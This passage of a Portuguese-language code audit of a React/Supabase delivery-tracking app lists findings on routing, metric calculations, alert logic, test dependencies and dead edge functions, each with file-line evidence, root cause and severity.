  src/hooks/useSLOMetrics.ts:220-221 — `const latBudget = SLO_TARGETS.latencyP95Ms; const latConsumed = latBudget > 0 ? Math.min((latency.p95 / latBudget) * 100, 999) : 0;`; src/hooks/useSLOMetrics.ts:242-244 — `status: classify(latency.p95, SLO_TARGETS.latencyP95Ms, false), errorBudgetConsumed: Math.round(latConsumed * 10) / 10, errorBudgetRemaining: Math.max(0, ...)`; src/hooks/useSLOMetrics.ts:114 — `if (value <= target) return 'healthy';`; src/pages/SLODashboardPage.tsx:74-75 — `{indicator.errorBudgetConsumed}% consumido` / `{indicator.errorBudgetRemaining}% livre`
  ```
- **Causa raiz:** Para latência, "consumido" é a razão entre o p95 observado e o alvo, não a fração de um orçamento de violação. Quando o p95 iguala o alvo (situação classificada como 'healthy' na linha 242), o cartão mostra 100% consumido e 0% livre.
- **Arquivos:** `src/hooks/useSLOMetrics.ts`, `src/pages/SLODashboardPage.tsx`
- **Etapas do plano:** 253


## Interface — rotas e RBAC

**3 achado(s).**


#### M-101 — Rota 404 quebra: NotFound é lazy e é a única rota sem Suspense, caindo no ErrorBoundary

- **Camada:** Interface — rotas e RBAC
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer link quebrado, URL digitada errada ou atalho antigo mostra a tela genérica de erro ("Ops! Algo deu errado") em vez da página 404 com o botão de voltar ao painel. O usuário acha que o sistema caiu quando só errou o endereço.
- **Evidência:**
  ```
  src/App.tsx:215 — `<Route path="*" element={<NotFound />} />` | src/App.tsx:85 — `const NotFound = lazyWithRetry(() => import("./pages/NotFound"));` | src/App.tsx:107-109 — `function SuspenseWrapper({ children }: { children: React.ReactNode }) {` / `return (` / `<Suspense fallback={<PageLoader />}>`
  ```
- **Causa raiz:** Esquecimento no item 58 (comentário em App.tsx:84 diz "lazy + com retry de chunk"): o componente foi convertido para lazy mas a rota catch-all não recebeu o wrapper. Um componente lazy sem Suspense ancestral faz o React lançar erro de renderização, que sobe até o ErrorBoundary de App.tsx:132.
- **Arquivos:** `src/App.tsx`, `src/lib/lazyWithRetry.ts`, `e2e/rbac.e2e.ts`
- **Etapas do plano:** 196

#### M-148 — Após login o usuário sempre cai no painel: AppLayout redireciona sem guardar a rota de origem

- **Camada:** Interface — rotas e RBAC
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quem recebe um link direto para um pedido, um alerta ou um relatório e ainda não está logado é levado ao login e, ao entrar, cai no painel inicial em vez da tela que pediu — tem de navegar de novo até lá. O mesmo acontece quando a sessão vence no meio do trabalho: perde-se o lugar.
- **Evidência:**
  ```
  src/components/layout/AppLayout.tsx:274-275 — `if (!user) {` / `return <Navigate to="/auth" replace />;` | src/pages/AuthPage.tsx:24 — `const from = (location.state?.from as { pathname?: string } | null)?.pathname ?? '/';` | src/pages/AuthPage.tsx:53 — `return <Navigate to={from} replace />;`
  ```
- **Causa raiz:** AppLayout é o elemento da rota-pai (App.tsx:154) e decide antes de renderizar o `<Outlet />` (AppLayout.tsx:327). Como ele já redireciona quando não há usuário, o ProtectedRoute de cada rota filha nunca chega a rodar nesse caminho — o `state={{ from: location }}` dele é código morto para as 49 rotas internas, e `from` na AuthPage é sempre undefined.
- **Arquivos:** `src/components/layout/AppLayout.tsx`, `src/components/auth/ProtectedRoute.tsx`, `src/pages/AuthPage.tsx`
- **Etapas do plano:** 286

#### B-031 — Cabeçalho mostra "Dashboard" em 25 das 49 telas internas, inclusive no Mapa ao Vivo canônico

- **Camada:** Interface — rotas e RBAC
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Metade das telas abre com o título "Dashboard" no alto, incluindo o Mapa ao Vivo, Contatos e todas as de segurança. O usuário não tem como confirmar onde está, e leitores de tela anunciam a página errada (o mesmo texto alimenta o `aria-label` do conteúdo principal).
- **Evidência:**
  ```
  src/components/layout/AppLayout.tsx:54 — `const config = pageConfig[location.pathname] || { title: 'Dashboard' };`; AppLayout.tsx:30 — `'/map': { title: 'Mapa ao Vivo', subtitle: 'Rastreamento em tempo real' },`; src/App.tsx:192 — `<Route path="/map" element={<Navigate to="/live-map" replace />} />`; src/App.tsx:190 — `<Route path="/live-map" element={<ProtectedRoute requiredRole="viewer"><SuspenseWrapper><LiveMapPage /></SuspenseWrapper></ProtectedRoute>} />`; render do título em src/components/layout/Header.tsx:143 — `{title}`.
  ```
- **Causa raiz:** O `pageConfig` é uma tabela manual que não acompanhou o crescimento das rotas e ficou presa no alias legado `/map` em vez da rota canônica `/live-map` (criada no item 50, App.tsx:191). O fallback silencioso (`|| { title: 'Dashboard' }`) esconde a falta.
- **Arquivos:** `src/components/layout/AppLayout.tsx`, `src/App.tsx`, `src/components/layout/sidebar-config.ts`
- **Etapas do plano:** 213


## Regras de negócio — ciclo de vida

**1 achado(s).**


#### M-053 — check-driver-alerts alerta sobre pedidos já encerrados: não filtra nem o status do pedido nem o rastreio encerrado

- **Camada:** Regras de negócio — ciclo de vida (+ 1 outro(s) local)
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** O sistema continua disparando 'motorista parado' e 'desvio de rota' para entregas que já foram concluídas ou canceladas, enchendo o painel de alerta falso e, quando o aviso automático ao fornecedor está ligado, mandando WhatsApp sobre um pedido que já acabou.
- **Evidência:**
  ```
  supabase/functions/check-driver-alerts/index.ts:86-107 (select sem filtro), :128-132 (laço só valida existência), :146-158 e :204-212 (dedup que limita o estrago), :176-189 (WhatsApp ao fornecedor). Linha encerrada permanece na tabela: supabase/migrations/20261123200000_optout_and_tracking_end.sql:88-95. Padrão correto: supabase/functions/job-worker/index.ts:538, :880, :704.
  ```
  Mesma causa, outro local — Backend — notificação e fila:
  ```
  supabase/functions/check-driver-alerts/index.ts:86-88 `const { data: trackingData, error: trackingError } = await supabase .from('active_tracking') .select(` e :107 `` ` `` `);` — fecha o select sem `.eq('tracking_status', …)` e sem `.limit()`.
  ```
- **Causa raiz:** A consulta traz TODAS as linhas de active_tracking, sem `.eq('tracking_status','ACTIVE')` e sem excluir pedidos em estado final — embora a tabela tenha a coluna tracking_status com índice parcial para exatamente esse filtro (supabase/migrations/20251224181640_...sql:104) e o campo order.status seja trazido no select (linha 102), sendo usado só no bloco de POD (linha 232). O job-worker faz o filtro certo nos dois pontos equivalentes (job-worker/index.ts:538 e :881: `.eq('tracking_status', 'ACTIVE')`), e o próprio job-worker barra pedido encerrado por status (linha 704).
- **Arquivos:** `supabase/functions/check-driver-alerts/index.ts`, `supabase/functions/job-worker/index.ts`
- **Etapas do plano:** 132


## Regras de negócio — cálculos

**8 achado(s).**


#### A-050 — Pontualidade é calculada com três fórmulas diferentes e uma delas conta pedido sem prazo como "no prazo"

- **Camada:** Regras de negócio — cálculos (+ 1 outro(s) local)
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O painel, a tela de SLA e o relatório mostram percentuais de pontualidade diferentes para o mesmo período, e todos tendem a inflar o número porque pedido sem prazo registrado entra como pontual.
- **Evidência:**
  ```
  src/hooks/useSLAMetrics.ts:80-84 — "const onTimeOrders = completedOrders.filter(o => {\n    if (!o.estimated_delivery || !o.actual_delivery) return true;"; src/hooks/useDashboardStats.ts:91-96 — "// Consider on-time if delivered within estimated time or within 15 min of scheduled\n        if (order.estimated_delivery) { ... } else {\n          if (diffMinutes <= 60) onTimeCount++;"; src/hooks/useAdvancedReports.ts:346-347 — "const onTime = completedRows.filter((r) => (r.delay_minutes || 0) <= 0).length;".
  ```
  Mesma causa, outro local — Interface — painéis e relatórios:
  ```
  src/hooks/useSLAMetrics.ts:80-89 e :168-170; src/hooks/useAdvancedReports.ts:334; src/pages/reports/useReportData.ts:100-102 e :110.
  ```
- **Causa raiz:** A mesma métrica de negócio ("Pontualidade") foi implementada três vezes, cada uma com um critério de pontualidade e um tratamento diferente para dado faltante, e nenhuma separa "no prazo" de "não dá para medir".
- **Arquivos:** `src/hooks/useAdvancedReports.ts`, `src/hooks/useDashboardStats.ts`, `src/hooks/useSLAMetrics.ts`, `src/pages/AdvancedReportsPage.tsx`, `src/pages/DashboardRedesigned.tsx`, `src/pages/SLADashboardPage.tsx`, `src/pages/reports/useReportData.ts`
- **Etapas do plano:** 089

#### A-051 — Regra de risco configurada como "+N pontos" só aplica metade

- **Camada:** Regras de negócio — cálculos
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quem configura as regras de risco em /risk-rules acha que está somando 4 pontos e soma 2; a justificativa gravada no alerta diz "+4 pontos" e o score não bate com ela.
- **Evidência:**
  ```
  supabase/functions/evaluate-driver/index.ts:694 "ruleBonus += (rule as RiskRule).score_impact;"; :695 "ruleFactors.push(`Regra \"${rule.name}\": +${rule.score_impact} pontos`);"; :713 "const finalScore = Math.min(10, riskAnalysis.score + (ruleBonus / 2));"; src/pages/RiskRulesPage.tsx:294 "+{rule.score_impact.toFixed(1)} pontos"; src/pages/RiskRulesPage.dialogs.tsx:82 "<Label htmlFor=\"score_impact\">Impacto no Score (pontos)</Label>".
  ```
- **Causa raiz:** A divisão por 2 foi introduzida na soma final sem nenhum comentário e sem ajustar o rótulo nem o texto da justificativa, que continuam anunciando o valor integral.
- **Arquivos:** `supabase/functions/evaluate-driver/index.ts`, `src/pages/RiskRulesPage.tsx`, `src/pages/RiskRulesPage.dialogs.tsx`
- **Etapas do plano:** 090

#### A-053 — Tolerância de atraso do ETA tem duas fontes diferentes; a do job-worker usa o campo de intervalo entre alertas como se fosse regra de negócio

- **Camada:** Regras de negócio — cálculos
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Ao ajustar a tolerância de atraso o dono muda só metade do sistema; e ao ajustar de quanto em quanto tempo o alerta pode repetir (min_interval_seconds) ele muda, sem saber, a própria regra de o que conta como atraso.
- **Evidência:**
  ```
  supabase/functions/job-worker/index.ts:709-714 ".select('min_interval_seconds, is_enabled')" ... "const thresholdMin = Math.max(1, Math.round(Number(cfg?.min_interval_seconds ?? 900) / 60));"; :716 "const lateMs = new Date(order.scheduled_at).getTime() + thresholdMin * 60_000;"; supabase/migrations/20261122131000_geo_eta_delay.sql:152 "v_late_limit := o.scheduled_at + make_interval(mins => d.late_tolerance_min);"; supabase/migrations/20251224181640_86877442-4075-4c58-8fcf-7a698b3af567.sql:73 "ADD COLUMN IF NOT EXISTS min_interval_seconds INTEGER DEFAULT 300,".
  ```
- **Causa raiz:** O mesmo alerta ETA_DELAY é emitido por dois caminhos (trigger geo_evaluate_tracking e maybeEmitEtaDelay no job-worker) e cada um lê a tolerância de uma coluna diferente. Com os defaults de seed os dois dão 15 min por coincidência (900 s / 60 = 15 e late_tolerance_min = 15), então a divergência fica invisível até alguém mexer em qualquer um dos dois valores.
- **Arquivos:** `supabase/functions/job-worker/index.ts`, `supabase/migrations/20261122131000_geo_eta_delay.sql`, `supabase/migrations/20261121193000_fix_escalation_pipeline.sql`
- **Etapas do plano:** 092

#### M-043 — Aprovação de motorista não registra quem aprovou e é feita em dois updates sem transação

- **Camada:** Regras de negócio — cálculos (+ 2 outro(s) local)
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Não há registro de quem liberou ou barrou cada motorista — exatamente o dado que se precisa quando uma entrega dá problema. E se a segunda escrita falhar, a fila marca "aprovado" enquanto o motorista continua pendente, travando o pedido.
- **Evidência:**
  ```
  src/hooks/useApprovalActions.ts:34-38 — ".update({ status: 'APPROVED', reviewed_at: new Date().toISOString(), decision_notes: notes || 'Aprovado manualmente' })\n        .eq('id', approvalId);" seguido de "supabase.from('drivers').update({ status: 'APPROVED' }).eq('id', driverId)"; coluna em supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:182 — "reviewed_by UUID,"; leitura em src/hooks/usePendingApprovals.ts:88.
  ```
  Mesma causa, outro local — Hooks e estado — dados de negócio:
  ```
  src/hooks/useApprovalActions.ts:34-39 `const { error: approvalError } = await supabase.from('driver_approval_queue').update({ status: 'APPROVED', ... }).eq('id', approvalId); if (approvalError) throw approvalError; const { error: driverError } = await supabase.from('drivers').update({ status: 'APPROVED' }).eq('id', driverId);` e :46-48 `await supabase.from('driver_approval_queue').update({ status: 'PENDING', ... }); await supabase.from('drivers').update({ status: 'PENDING_APPROVAL' }).eq('id', data.driverId); queryClient.invalidateQueries({ queryKey: ['pending-approvals'] });`
  ```
  Mesma causa, outro local — Regras de negócio — ciclo de vida:
  ```
  src/hooks/useApprovalActions.ts:34-36, 56-58, 78-80, 93-95; coluna em supabase/migrations/20251224143803_*.sql:182; padrão correto em src/hooks/usePasswordResetActions.ts:36; leitura em src/hooks/usePendingApprovals.ts:88.
  ```
- **Causa raiz:** O campo de auditoria nunca foi preenchido na escrita, embora exista no banco e seja lido pela UI; e as duas escritas (fila + cadastro do motorista) são chamadas independentes, sem RPC transacional.
- **Arquivos:** `src/hooks/useApprovalActions.ts`, `src/hooks/useApprovalActionsEnhanced.ts`, `src/hooks/usePasswordResetActions.ts`, `src/hooks/usePendingApprovals.ts`, `supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql`
- **Etapas do plano:** 122

#### M-045 — Dinheiro somado em ponto flutuante, com moeda de um pedido aplicada ao total e denominadores diferentes para o mesmo "custo médio"

- **Camada:** Regras de negócio — cálculos
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O relatório financeiro mostra custo médio e custo por quilômetro menores do que a realidade quando há pedidos sem valor registrado, apresenta a média do centro de custo numa base diferente da média geral, e rotula o total com uma moeda que pode não ser a de todos os pedidos somados.
- **Evidência:**
  ```
  src/hooks/useAdvancedReports.ts:285-287 — `const withCost = filtered.filter((r) => typeof r.total_cost === 'number' && r.total_cost! > 0);` / `const totalCost = withCost.reduce(...)` / `const totalKm = filtered.reduce((acc, r) => acc + (r.distance_meters || 0), 0) / 1000;`; useAdvancedReports.ts:294-304 — `g.count += 1;` ... `avg: g.count ? round(g.total / g.count, 2) : 0,`; useAdvancedReports.ts:311-312 — `avgCost: withCost.length ? round(totalCost / withCost.length, 2) : 0,` / `costPerKm: totalKm > 0 ? round(totalCost / totalKm, 2) : 0,`
  ```
- **Causa raiz:** Três problemas na mesma conta: (a) valores monetários acumulados como number binário e só arredondados no fim; (b) a moeda do total é a do primeiro pedido que tiver alguma — e há duas origens de preço com moedas próprias (supabase/functions/lalamove-api/index.ts:468-469 grava currency do priceBreakdown; supabase/functions/lalamove-uapi/index.ts:440-441 grava 'BRL' fixo); (c) "custo médio" divide por pedidos com custo, enquanto a média por centro de custo divide por todos os pedidos do grupo, e custo/km divide o custo de alguns pedidos pela distância de todos.
- **Arquivos:** `src/hooks/useAdvancedReports.ts`, `src/pages/AdvancedReportsPage.tsx`, `supabase/functions/lalamove-uapi/index.ts`, `supabase/functions/lalamove-api/index.ts`
- **Etapas do plano:** 124

#### M-046 — Tabela de pedidos e análise preditiva tratam o limiar configurado como se fosse o desvio medido

- **Camada:** Regras de negócio — cálculos
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Todo pedido cadastrado com tolerância acima de 15 minutos aparece permanentemente marcado como "Motorista Parado" ou "Desvio de Rota" no painel, mesmo com o motorista rodando normalmente — e pedidos realmente parados, com tolerância de 10 minutos, não recebem marca nenhuma.
- **Evidência:**
  ```
  src/components/dashboard/OrdersTable.tsx:45-47 "if (order.stalled_threshold_minutes && order.stalled_threshold_minutes > 15) { return { label: 'Motorista Parado', variant: 'glow-destructive' as BadgeVariant }; }"; :48-50 mesmo padrão com route_deviation_threshold_minutes; src/hooks/usePredictiveAnalysis.ts:54 ".filter(o => o.status === 'ON_GOING' && o.route_deviation_threshold_minutes && o.route_deviation_threshold_minutes > 15)"; :57 "deviation: o.route_deviation_threshold_minutes || 0,". Contraprova do campo medido: usePredictiveAnalysis.ts:44 ".filter(o => o.status === 'ON_GOING' && (o.delay_minutes || 0) >= stalledThreshold)".
  ```
- **Causa raiz:** Confusão entre configuração e medição: `stalled_threshold_minutes` e `route_deviation_threshold_minutes` são a tolerância cadastrada no pedido, não minutos parado nem desvio observado.
- **Arquivos:** `src/components/dashboard/OrdersTable.tsx`, `src/hooks/usePredictiveAnalysis.ts`
- **Etapas do plano:** 125

#### B-028 — Orçamento de mapas do Mapbox nasce com limite zero e parada obrigatória — bloqueia no primeiro centavo e sem aviso prévio

- **Camada:** Regras de negócio — cálculos
- **Severidade:** Baixa · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Assim que o uso do Mapbox passar da franquia gratuita, busca de endereço, rota e otimização param de responder de uma vez, sem nenhum aviso antes — e o Mapbox é o provedor padrão das funções de mapa.
- **Evidência:**
  ```
  supabase/migrations/20261122130100_geo_foundation.sql:148 — `hard_stop          boolean NOT NULL DEFAULT true,` e :154 — `INSERT INTO public.geo_budget (provider, monthly_limit_usd) VALUES ('google', 50.00), ('mapbox', 0.00)`; :175 — `(b.monthly_limit_usd > 0 AND COALESCE(u.spent,0) >= b.monthly_limit_usd * b.alert_at_pct / 100.0) AS warn`; contraprova do "mudo": supabase/migrations/20261123120000_geo_budget_cron.sql:95 — `IF r.blocked THEN` e :112 — `VALUES ('GEO_BUDGET_WARNING', 'CRITICAL', v_title, v_message,`
  ```
- **Causa raiz:** Com limite 0, a condição de bloqueio (`spent >= limite AND spent > 0`) é verdadeira assim que o primeiro dólar faturável é medido, e a condição de aviso (`limite > 0`) é falsa para sempre — ou seja, o Mapbox é desligado sem nunca ter passado pelo estágio de aviso de 80%.
- **Arquivos:** `supabase/migrations/20261122130100_geo_foundation.sql`, `supabase/functions/geo-gateway/resolver.ts`, `supabase/migrations/20261123120000_geo_budget_cron.sql`, `supabase/migrations/20261123100000_geo_settings_auto_and_mapbox_only.sql`
- **Etapas do plano:** 210
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Acesso de leitura ao banco oficial iecgydonctmabiijadsf (nenhum MCP desta sessão aponta para ele, conforme AGENTS.md) para ler geo_budget.monthly_limit_usd/hard_stop e geo_usage_month do mês corrente — o valor pode ter sido alterado pela tela de administração depois do seed.

#### B-044 — Contador de espera da fila: a faixa "urgente" (15–30 min) é desenhada igual à de "atenção", e o outro componente usa cinco faixas em vez de quatro

- **Camada:** Regras de negócio — cálculos
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Uma aprovação esperando 25 minutos aparece com a mesma cor de uma esperando 6, e dois componentes da mesma fila classificam a mesma espera de formas diferentes — o operador não consegue priorizar pela cor.
- **Evidência:**
  ```
  src/components/approvals/WaitingTimeCounter.tsx:41-48 — "  // 5-15 minutes - attention\n  if (totalMinutes < 15) {\n    return 'bg-warning/20 text-warning';\n  }\n  // 15-30 minutes - urgent\n  if (totalMinutes < 30) {\n    return 'bg-warning/20 text-warning';\n  }"; src/components/approvals/UrgencyIndicator.tsx:85-90 — `function getUrgencyLevel(totalMinutes: number): UrgencyLevel { if (totalMinutes < 5) return 'normal'; ... return 'overdue'; }`
  ```
- **Causa raiz:** O ramo de 15–30 min foi escrito com a classe do ramo anterior, então o estado "urgente" não tem representação visual; e o segundo componente de urgência foi criado com uma escala própria de cinco níveis, sem alinhar com o contador nem com o documento.
- **Arquivos:** `src/components/approvals/WaitingTimeCounter.tsx`, `src/components/approvals/UrgencyIndicator.tsx`, `docs/agentes/regras-dominio.md`
- **Etapas do plano:** 264


## Testes

**1 achado(s).**


#### B-060 — Ferramental de teste declarado em `dependencies` em vez de `devDependencies`

- **Camada:** Testes
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Instalação e build mais pesados do que precisam, e some a barreira que impede alguém importar utilitário de teste dentro de código de tela por engano. Não quebra nada hoje; é acabamento.
- **Evidência:**
  ```
  EXECUTADO. Linhas reais: package.json:56 `"@testing-library/dom": "^10.0.0",`, :57 `"@testing-library/jest-dom": "^6.6.0",`, :58 `"@testing-library/react": "^16.3.2",`, :74 `"jsdom": "^30.0.1",`, :96 `"vitest": "^5.0.3",` — todas dentro de `dependencies` (bloco package.json:21-101). Bloco correto: package.json:102-104 `"devDependencies": { "@axe-core/playwright": "^4.13.0", ...`. Contraprova ao risco alegado: .github/workflows/ci.yml:18 `- run: npm ci` (idem :36,:49,:77,:91,:107), sem `--omit=dev`; nenhum arquivo de produção em src/ importa vitest, jsdom ou @testing-library (grep excluindo .test/.spec/setup voltou vazio); jsdom só aparece em vitest.config.ts:8 `environment: "jsdom",`.
  ```
- **Causa raiz:** Os pacotes foram instalados sem `-D`. Como estão em `dependencies`, qualquer instalação de produção (`npm ci --omit=dev`) baixa jsdom, vitest e a biblioteca de testes, e o bundler passa a enxergá-los como dependências legítimas do app.
- **Arquivos:** `package.json`, `package-lock.json`
- **Etapas do plano:** 297


## Transversal — código morto e duplicação

**4 achado(s).**


#### A-015 — Duas edge functions de DDL destrutivo (apply-fixes, seed-fix-rls) continuam no repo e no deploy automático, sem nenhum chamador e sem checagem de papel

- **Camada:** Transversal — código morto e duplicação (+ 2 outro(s) local)
- **Severidade:** Alta · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Um endpoint publicado da empresa, que ninguém usa, é capaz de abrir os dados de pedidos, motoristas, incidentes e rastreamento para qualquer pessoa na internet sem login, e de permitir que um usuário comum se promova a administrador. Basta um usuário com senha do sistema (ou nenhum login, depois da primeira chamada) para vazar a base de operações.
- **Evidência:**
  ```
  supabase/functions/apply-fixes/index.ts:46-49 (SQL) + :55 (rpc 'exec') + :58-60 (erro engolido); supabase/functions/seed-fix-rls/index.ts:46-48,100 (SQL) + :140 (rpc 'exec' com throwOnError); .github/workflows/deploy-edges.yml:42-47 (deploy de todas as functions); ausência de public.exec em supabase/migrations/ e em src/integrations/supabase/types.ts:4217+; scripts/db-audit/known-violations.json (mesmo achado já registrado como baseline).
  ```
  Mesma causa, outro local — Transversal — segurança:
  ```
  As duas funções NÃO estão em supabase/config.toml, portanto valem verify_jwt=true (default) e exigem JWT válido: o ataque exige conta logada, não é anônimo. O `Access-Control-Allow-Origin: '*'` (apply-fixes/index.ts:12, seed-fix-rls/index.ts:12) não afeta autenticação. O SQL depende de uma RPC inexistente no repo: apply-fixes/index.ts:55 chama `rpc('exec', { query: sql })` e seed-fix-rls/index.ts:140 chama `rpc('exec', { sql_text: sql })` — assinaturas incompatíveis entre si e nenhuma migration cria `public.exec`. O comentário em seed-fix-rls/index.ts:138 diz 'precisamos criar uma função primeiro'. O furo do anon em produção veio de supabase/migrations/20260828000001_seed_fix_rls.sql (citada em 20261122150100_fix_public_rls_bypass.sql:1-2), não da edge.
  ```
  Mesma causa, outro local — Backend — demais edges:
  ```
  supabase/functions/apply-fixes/index.ts:36-37 (service_role sem auth), :55 (`supabase.rpc('exec', { query: sql })`), :58-60 (catch que converte a falha em `ERR:` e retorna success:true). supabase/functions/seed-fix-rls/index.ts:35-37 e :140 (`supabase.rpc('exec', { sql_text: sql }).throwOnError()`). Ausência da RPC: 0 matches em supabase/migrations/ e ausência em src/integrations/supabase/types.ts (Functions a partir da linha 4217; só mcp_exec:4494 e mcp_exec_many:4495). Registro prévio: scripts/db-audit/known-violations.json.
  ```
- **Causa raiz:** São scripts de manutenção de uma sessão antiga que nunca foram removidos. Nenhuma das duas está declarada em supabase/config.toml, então herdam `verify_jwt` padrão (true) — qualquer usuário logado, inclusive `viewer`, tem JWT válido e passa. Dentro do código não há segunda checagem de papel (padrão que `geo-admin/index.ts:75-84` e `mcp-query/index.ts:6-8` aplicam corretamente). O deploy-edges.yml publica todas as functions do diretório, então elas existem como endpoint em produção.
- **Arquivos:** `.github/workflows/deploy-edges.yml`, `supabase/config.toml`, `supabase/functions/_shared/schemas.ts`, `supabase/functions/apply-fixes/index.ts`, `supabase/functions/seed-fix-rls/index.ts`, `supabase/migrations/20261122150100_fix_public_rls_bypass.sql`
- **Etapas do plano:** 030
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: As duas chamam `supabase.rpc('exec', ...)` (apply-fixes/index.ts:55, seed-fix-rls/index.ts:140) e NÃO existe nenhuma `CREATE FUNCTION exec` em supabase/migrations/ (grep por `function exec` nas migrations: 0 resultados). Se a RPC `exec` não existir em produção, as chamadas falham e o dano é zero hoje; se existir (criada à mão ou pela Lovable, fora das migrations), a escalada é imediata. Falta acesso de leitura ao banco iecgydonctmabiijadsf para rodar `select proname from pg_proc where proname='exec'` — nenhum MCP desta sessão aponta para esse projeto.

#### B-026 — Dois `useWalletBalance` exportados com formatos de dado diferentes; a tela de UAPI usa a versão sem trava de configuração e consulta a cada 30s mesmo sem Lalamove configurado

- **Camada:** Transversal — código morto e duplicação
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** A tela de configuração da UAPI fica consultando o saldo da conta Lalamove a cada 30 segundos mesmo quando a integração nem está configurada, gerando erro repetido e consumo de cota/limite da API. E o saldo tem dois caches independentes, então a mesma conta pode mostrar valores diferentes em duas telas.
- **Evidência:**
  ```
  src/hooks/useUAPI.ts:28-38 vs src/hooks/useLalamove.ts:27-39 e :191; src/pages/UAPISettingsPage.tsx:2 e :13; src/lib/lalamove-config.ts:9-26 (`setLalamoveConfigured` sem chamador → `isLalamoveConfigured()` sempre false); src/App.tsx:199 (rota /settings/uapi).
  ```
- **Causa raiz:** src/hooks/useUAPI.ts (65 linhas) é a camada antiga e src/hooks/useLalamove.ts reexporta os nomes antigos "para compatibilidade" (comentário em :190). As duas chegam ao mesmo backend (src/lib/uapi-proxy.ts:1 importa `callLalamoveGateway`, destino `target: 'uapi'`), mas com query keys diferentes, nomes de campo diferentes (`balanceCents/balanceFormatted` vs `cents/formatted`) e guardas diferentes. Nenhum dos 7 exports de useUAPI.ts é referenciado fora dele além de UAPISettingsPage.tsx.
- **Arquivos:** `src/hooks/useUAPI.ts`, `src/hooks/useLalamove.ts`, `src/pages/UAPISettingsPage.tsx`, `src/lib/uapi-proxy.ts`
- **Etapas do plano:** 208

#### B-027 — O mapa "hero" do dashboard tem altura fixa de 300px dentro de um cartão de até 600px, e a prop activeDeliveries que ele recebe nunca é usada

- **Camada:** Transversal — código morto e duplicação
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** No monitor do operador, o bloco principal do dashboard — o mapa ao vivo — ocupa metade da altura reservada e a outra metade fica um retângulo vazio. É a tela mais vista do sistema e parece quebrada.
- **Evidência:**
  ```
  src/components/dashboard/LiveMapPlaceholder.tsx:14 (assinatura com activeDeliveries não usado) e :43-47 (LiveMap com h-[300px] fixo); src/pages/DashboardRedesigned.tsx:366-368; src/components/map/LiveMap.tsx:403.
  ```
- **Causa raiz:** O componente nasceu como espaço reservado (daí o nome) com um contador, depois recebeu o `LiveMap` de verdade mas manteve a altura fixa do protótipo e o parâmetro do contador. O `className` responsivo fica no `div` de fora (:18) e o mapa não acompanha.
- **Arquivos:** `src/components/dashboard/LiveMapPlaceholder.tsx`, `src/pages/DashboardRedesigned.tsx`, `src/components/map/LiveMap.tsx`
- **Etapas do plano:** 209

#### B-058 — Dashboard principal mostra o código em inglês do status e some com o ícone do veículo: o mapa de status/ícones do OrdersTable divergiu da cópia usada na página de Pedidos

- **Camada:** Transversal — código morto e duplicação
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Na primeira tela que todo usuário vê (o dashboard), um pedido que está buscando motorista aparece escrito "ASSIGNING_DRIVER" em vez de "Atribuindo Motorista", e pedidos de Fiorino, MPV ou caminhão aparecem sem o ícone do veículo. A mesma lista na página de Pedidos mostra tudo certo, o que faz o operador duvidar de qual tela está certa.
- **Evidência:**
  ```
  src/components/dashboard/OrdersTable.tsx:32-40 (8 status) + :87 e :199 fallback `label: order.status`; src/types/index.ts:31-42 (11 status); supabase/migrations/20261122120000_baseline_order_status_values.sql:16-18 (QUOTED/ASSIGNING_DRIVER/DELIVERING no enum do banco); src/hooks/useRecentOrders.ts:22,53 (status vem direto de lalamove_orders). Contraprova do ícone: supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:18-23 e src/types/index.ts:44-48 — vehicle_type/VehicleType só MOTORCYCLE/CAR/VAN/TRUCK, sem ADD VALUE posterior.
  ```
